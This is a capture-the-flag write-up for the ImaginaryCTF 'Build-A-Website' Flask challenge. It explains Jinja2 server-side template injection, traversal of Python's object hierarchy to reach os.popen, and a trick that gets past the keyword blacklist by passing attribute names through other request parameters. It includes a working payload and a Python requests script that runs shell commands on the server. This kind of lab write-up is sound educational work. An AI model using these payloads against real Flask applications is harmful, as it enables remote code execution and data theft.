# Build-A-Website | Points: 100 | Solves: 247

I made a website where y'all can create your own websites! Should be considerably secure even though I'm a bit rusty with Flask. 

Attachments: 
- https://imaginaryctf.org/r/3ACF-app.py
- http://build-a-website.chal.imaginaryctf.org/

#

When visiting the site we are presented with a short descriptive text and an input field where we are "supposed" to input some HTML code. We are however obviously going to input other things than just plain old HTML. 

Taking a look at <span>app.py</span> we find the following interesting piece of code:
```python
@app.route('/site')
def site():
    content = b64decode(request.args['content']).decode()
    #prevent xss
    blacklist = ['script', 'iframe', 'cookie', 'document', "las", "bas", "bal", ":roocursion:"] # no roocursion allowed
    for word in blacklist:
        if word in content:
            # this should scare them away
            content = "*** stack smashing detected ***: python3 terminated"
    csp = '''<head>\n<meta http-equiv="Content-Security-Policy" content="default-src 'none'">\n</head>\n'''
    return render_template_string(csp + content)
```

Whatever we write into the "content" variable will have to pass the blacklist and the CSP. The words "las", "bas" and "bal" look a little weird but practically they will stop us from accessing attributes like ```__class__```, ```__globals__``` or ```__bases__```. Or atleast we will have to get a bit more creative to do so. At the end of this writeup I will discuss how to bypass the blacklist but let's first discuss what our objective is. 

There probably exists a file like "flag.txt" and our end goal will be to read it. How can we do that? Either we take the pure python route and use open() or we attempt to get a shell and use cat. Lets investigate how we might access those normally, without a blacklist. As previously mentioned we are given an input field and a good thing to try out is to check for flask injections, or more specifically Jinja injections (which will obviously work since we have the source code but nevertheless a good thing to try in a blackbox scenario). We can input ```{{1+1}}``` and proudly observe the resulting site content is "2". Furthermore we can investigate some global variables available in Flask, specifically we will use "config" and "request". Remember that we wish to read a file and in this case lets choose to try to get a shell. For that we will need to access the os module to then in turn call ```os.popen("cat flag.txt").read()```. How can we do that? The answer is by traversing Pythons object hierarchy! 

Let's again imagine there is no blacklist. Inputing ```{{config.__class__}}``` we can see the class that config belongs to is ```dict```. From here we have a couple options. The os module can sometimes be access via the attribute ```__globals__```. We can try something like ```{{config.__class__.__init__.__globals__}}``` but this gets us nothing. Honestly I don't know when and why this does or doesn't work but what I do know is sometimes the os module can be accessed this way and even more importantly there are other ways to access it. For example we can import it via the function ```load_module``` from the class ```_frozen_importlib.BuiltinImporter```. This is a direct subclass of the ```object``` class, the root class of all classes in Python. We can go down in the class hierarchy via the ```__subclass__``` function and we can just as easily go up the hierarchy via the function ```mro```. A few details remain like the fact that when traversing the object hierarchy we sometimes have to deal with lists which have to be indexed using numbers and the exact order differs from system to system. Nevertheless our exploit to read flag.txt looks like this: 

```python
config.__class__.mro()[1].__subclasses__()[84].load_module("os").popen("cat flag.txt").read()
```

Great! But so far I have said things like "imagine there is no blacklist" all the while making claims about some code working and some not. To bypass the blacklist we can use a nice trick. In Python we have two options when accessing attributes of a class, either by ```class.someAttribute``` or ```class["someAttribute"]```. Furthermore notice the blacklist is only applied to the "content" parameter. We are otherwise free to pass whatever content we want to other parameters which we can exploit. Remember that Flask has a global variable "request", through which we can access get-parameters. Aha! Finally our exploit is finished:

```python
import requests
from base64 import b64encode
params = {
    "a" : "__class__", 
    "b" : "__subclasses__", 
    "content" : b64encode(b"{{config[request.args.a].mro()[1][request.args.b]()[84].load_module('os').popen('cat flag.txt').read()}}")
}
r = requests.get("https://build-a-website.chal.imaginaryctf.org/site", params=params)
print(r.text)
```

This will expand to:

```python
config["__class__"].mro()[1]["__subclasses__"]()[84].load_module("os").popen("cat flag.txt").read()
```

Which gets us the flag: ictf{:rooYay:\_:rooPOG:\_:rooHappy:\_:rooooooooooooooooooooooooooo:}
